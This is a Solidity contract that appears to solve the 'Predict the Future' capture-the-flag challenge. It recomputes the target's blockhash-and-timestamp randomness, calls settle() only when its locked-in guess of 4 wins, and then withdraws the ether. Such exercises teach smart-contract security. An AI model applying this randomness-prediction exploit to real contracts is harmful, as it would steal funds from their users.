pragma solidity ^0.4.21;
import "./PredictTheFutureChallenge.sol";

contract PredictTheFutureChallengeExploit {
    uint8 n = 4; // my lucky number
    address contractAddress = 0x11412611ae3D5c273c80E3de7FC333724D78630F;
    address owner;
    function PredictTheFutureChallengeExploit() public payable {
        require(msg.value == 1 ether);
        owner = msg.sender;
    }

    function () public payable {}

    function lockInGuess() public{
        PredictTheFutureChallenge s = PredictTheFutureChallenge(contractAddress);
        s.lockInGuess.value(1 ether)(n);
    }

    function exploit() public payable{
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(answer == n);
        PredictTheFutureChallenge s = PredictTheFutureChallenge(contractAddress);
        s.settle();
    }

    function withdraw() public{
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}